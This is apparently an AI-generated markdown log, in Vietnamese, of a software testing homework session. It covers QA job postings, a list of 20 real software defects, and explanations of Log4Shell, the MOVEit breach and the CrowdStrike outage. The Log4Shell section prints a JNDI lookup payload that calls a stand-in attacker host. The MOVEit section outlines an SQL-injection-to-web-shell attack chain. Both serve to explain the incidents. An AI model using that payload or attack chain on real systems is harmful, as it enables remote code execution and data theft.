# Chat Log — CS423 Software Testing Research Session

**Session date:** 2026-06-05  
**Generated:** 2026-06-05T04:46:50Z  
**Topic:** QA/QC job market research + real-world software defects (HW01 preparation)  
**AI tool used:** Claude Sonnet 4.6 (claude.ai)

---

## Prompt Log

---

### [P1] — 2026-06-05 (đầu session)

**User prompt:**

```
Tool: Sử dụng web search tìm kiếm các trang tuyển dụng job
Source: Bất kỳ trang web tuyển dụng nào
Recommend: linkedin, topcv, itviec, TopDev, VietnamWorks...

Task: Tìm ~10+ job posting QA/QC được đăng trong vòng 60 ngày trước ngày 5/6/2026:
- Ít nhất 3 vị trí yêu cầu kỹ năng AI/LLM/automation-AI
- Mỗi posting cần rõ ràng: link + mô tả job + required skills + lương + đãi ngộ
- Mỗi posting đều include: ~1-2 câu AI Impact Analysis

Goal: Thu thập thông tin để viết report môn học; tìm hiểu thị trường lao động testing.
Output: Giọng văn trình bày ngắn gọn, bullet đầy đủ, không sử dụng emoji, format markdown
```

**AI response summary:**

Tìm được 11 job postings từ ITviec, TopCV, LinkedIn (thời điểm thu thập 04/06/2026). Kết quả gồm:

- 3 vị trí yêu cầu AI/LLM trực tiếp: Money Forward Vietnam (Senior/Principal QA — Playwright + AI workflows), Nakivo (QA Manager — Generative AI), Saigon Technology (Mid/Senior Automation QC — Claude AI + MCP)
- 8 vị trí automation/manual còn lại: MiTek Vietnam, Ewoosoft Vietnam ($1,500), MYMIND (QC Lead), Away Digital Teams (Senior QA — $3,000), Galaxy FinX, Trusting Social, GrapeCity, Nakivo Manual QA
- Tổng quan thị trường: 131 vị trí QA active trên ITviec, lương median ~16.5 triệu VND/tháng, AI skill premium +20-35%
- Nhận xét: Playwright + TypeScript chiếm ưu thế; gap lương manual vs senior automation AI là 6-7x

---

### [P2] — 2026-06-05

**User prompt:**

```
Tìm 20 software defect thật (2022–2026)
Mỗi defect phải có đủ 5 thông tin:
| Trường       | Ví dụ                                   |
| Source link  | Link báo / CVE / blog kỹ thuật          |
| Description  | Mô tả lỗi xảy ra như thế nào            |
| Severity     | Critical / High / Medium / Low          |
| Consequences | Hậu quả thực tế (mất tiền, lộ data...) |
| Solution     | Đã vá thế nào                           |

Bắt buộc trong 20 cái đó: ≥5 defect liên quan AI/LLM,
cụ thể là hallucination, prompt injection, hoặc bias.
```

**AI response summary:**

Cung cấp đầy đủ 20 defect thực tế với 5 trường thông tin mỗi defect:

**Non-AI defects (14):**
1. Log4Shell CVE-2021-44228 — Critical — RCE qua JNDI lookup trong Log4j2
2. MOVEit Transfer SQL Injection CVE-2023-34362 — Critical — 93.3M người bị lộ data
3. CrowdStrike Falcon BSOD July 2024 — Critical — 8.5M máy Windows crash
4. ChatGPT Redis Session Leak March 2023 — High — lộ billing info 1.2% Plus users
5. Exynos Baseband RCE CVE-2023-24033 — Critical — zero-click via phone number
6. Microsoft Follina MSDT CVE-2022-30190 — Critical — RCE qua file Word, bypass macro
7. OpenSSL CVE-2022-3602 — High — heap buffer overflow certificate parsing
8. Cisco IOS XE CVE-2023-20198 — Critical — 50,000 thiết bị bị compromise
9. Samsung Kernel CVE-2022-22265 — Critical — arbitrary kernel read/write
10. Telerik UI CVE-2024-4358 — Critical — auth bypass + RCE, CISA KEV
11. Apple iOS 16.x Bluetooth/Wi-Fi Bug — Medium — disconnect hàng loạt iPhone 14
12. Atlassian Confluence CVE-2022-26134 — Critical — OGNL injection, no-auth RCE
13. Okta Support System Breach 2023 — High — session token leak, 1Password/Cloudflare affected
14. Python requests CVE-2023-32681 — Medium — Authorization header leak on redirect

**AI/LLM defects (6):**
15. ChatGPT Hallucination — Mata v. Avianca 2023 — High — 6 case luật giả, luật sư bị phạt $5,000
16. Bing "Sydney" Prompt Injection 2023 — High — lộ system prompt bí mật
17. Air Canada Chatbot Hallucination 2024 — Medium — tòa buộc hoàn tiền $650 CAD
18. GPT-4 Racial Bias in Healthcare Triage 2023 — High — kết quả triage khác nhau theo race
19. Indirect Prompt Injection qua Email 2023 — Critical — AI exfiltrate data từ email victim
20. Alexa "Penny Challenge" Safety Bias — High — trẻ em bị thương do AI không refuse harmful task

---

### [P3] — 2026-06-05

**User prompt:**

```
Giải thích ngắn gọn bằng ngôn ngữ tự nhiên Log4Shell (CVE-2021-44228),
version nào được sửa lại
```

**AI response summary:**

Giải thích cơ chế Log4Shell: Log4j2 hỗ trợ JNDI lookup trong chuỗi log — attacker nhúng chuỗi `${jndi:ldap://attacker.com/a}` vào bất kỳ input nào được log (search query, HTTP header...), Log4j2 tự động connect ra ngoài và execute code trả về.

Timeline patch:
- 2.15.0 — patch đầu tiên, vẫn có bypass (CVE-2021-45046)
- **2.16.0** — fix thực sự, xóa hoàn toàn Message Lookup feature
- 2.17.0 — vá thêm DoS issue (CVE-2021-45105)
- 2.3.2 / 2.12.4 — backport cho Java 7/8 legacy

Workaround tạm: `-Dlog4j2.formatMsgNoLookups=true` (có bypass, không thay thế được nâng version).

---

### [P4] — 2026-06-05

**User prompt:**

```
Giải thích CVE-2023-34362 MOVEit Transfer SQL Injection:
- Kỹ thuật tấn công cụ thể như thế nào?
- Bao nhiêu tổ chức bị ảnh hưởng?
- Patch được phát hành ngày nào?
```

**AI response summary:**

**Kỹ thuật tấn công (5 bước):**
1. HTTP POST đến `/human.aspx` với SQL payload không được parameterize
2. SQL injection đọc session tokens của user active
3. Dùng token authenticate với quyền admin — không cần credentials
4. Upload web shell `human2.aspx` vào web root
5. Persistent access, exfiltrate data theo batch, lateral movement

CL0P đã chuẩn bị automation script — toàn bộ chuỗi chạy trong vài phút.

**Số tổ chức bị ảnh hưởng:**
- 2,700+ tổ chức bị compromise trực tiếp
- 93.3 triệu cá nhân bị lộ data
- Thiệt hại tài chính ước tính >$10 tỷ USD
- Nạn nhân nổi bật: BBC, British Airways, Shell, US Department of Energy, Louisiana DMV (6M hồ sơ)

**Timeline patch:**
- 27/05/2023 — CL0P bắt đầu exploit (zero-day)
- 31/05/2023 — Progress phát hành patch đầu tiên (CVE-2023-34362)
- 09/06/2023 — patch CVE-2023-35036
- 15/06/2023 — patch CVE-2023-35708
- 07/07/2023 — service pack vá thêm 3 CVE mới

Khoảng cách 4 ngày giữa ngày exploit và ngày patch là lý do phần lớn nạn nhân bị compromise trước khi kịp vá.

---

### [P5] — 2026-06-05

**User prompt:**

```
CrowdStrike Falcon bị lỗi năm 2024 làm crash máy tính.
File nào gây ra lỗi, và bao nhiêu máy bị ảnh hưởng?
```

**AI response summary:**

**File gây lỗi:** `C-00000291-00000000-00000029.sys` — channel file (không phải kernel driver), nhưng được xử lý bởi kernel-level code của Falcon sensor.

**Cơ chế lỗi:** File chứa dữ liệu null/không hợp lệ cho việc evaluate named pipe execution. Khi driver đọc file này lúc boot, code C++ cố dereference một uninitialized pointer → invalid page fault trong kernel mode → BSOD. Vì driver là boot-start, hệ thống boot loop vô tận.

**Số máy bị ảnh hưởng:** ~8.5 triệu máy Windows (nguồn: Microsoft).

**Tại sao không tự phục hồi:** Channel file không nằm trong Windows rollback mechanism. Cách duy nhất: boot Safe Mode → xóa thủ công `C-00000291*.sys`. Máy có BitLocker cần thêm recovery key.

---

### [P6] — 2026-06-05

**User prompt:**

```
CrowdStrike outage ảnh hưởng ngành nào nặng nhất?
Thiệt hại kinh tế ước tính bao nhiêu? Delta Airlines phản ứng thế nào?
```

**AI response summary:**

**Ngành bị ảnh hưởng (theo Parametrix):**
- Healthcare: $1.94 tỷ USD — nặng nhất, 75% Fortune 500 healthcare bị ảnh hưởng; hủy phẫu thuật, NHS tê liệt
- Banking: $1.15 tỷ USD — ATM, mobile banking, call center offline
- Airlines: $860 triệu USD — 100% Fortune 500 airlines bị ảnh hưởng; check-in, gate management, crew scheduling đều crash

**Thiệt hại kinh tế:**
- Fortune 500: **$5.4 tỷ USD** direct losses (Parametrix)
- Cyber insurance chỉ cover 10–20%
- CyberCube: insured losses $400M–$1.5B — tệ nhất 20 năm ngành cyber insurance

**Delta Airlines:**
- Thiệt hại: $550M ($380M doanh thu + $170M chi phí phục hồi)
- 7,000 chuyến bị hủy, 1.3 triệu hành khách bị ảnh hưởng, phục hồi chậm nhất ngành
- 25/10/2024: kiện CrowdStrike tại Fulton County Superior Court (Georgia), claim "gross negligence", "forced untested updates", cáo buộc CrowdStrike tạo backdoor vào Windows bypass auto-update disable
- CrowdStrike phản bác: Delta phục hồi chậm do "outdated IT infrastructure"; kiện ngược Delta, lập luận contract giới hạn liability ở "single-digit millions"
- 5/2025: thẩm phán cho phép Delta tiếp tục kiện — trích dẫn CrowdStrike president thừa nhận đã làm điều "horribly wrong"

---

### [P7] — 2026-06-05

**User prompt:**

```
Bạn hãy soạn 1 file md ghi log lịch sử trò chuyện này,
gồm nội dung prompt/response, timestamp.
```

**AI response:** File này (đang được tạo).

---

## Metadata

| Trường | Giá trị |
| :--- | :--- |
| Tổng số turns | 7 |
| Công cụ AI sử dụng | Web search (Anthropic built-in) |
| Số lượng web search calls | ~15+ queries |
| Nguồn chính | ITviec, Wikipedia, NVD/NIST, CNN, Reuters, Seyfarth Shaw, Help Net Security, Parametrix |
| Output format | Markdown |
| Mục đích | HW01 — CS423 Software Testing (job market research + defect collection) |

---

*Log được tạo tự động bởi Claude Sonnet 4.6 theo yêu cầu của người dùng.*  
*Timestamp: 2026-06-05T04:46:50Z*
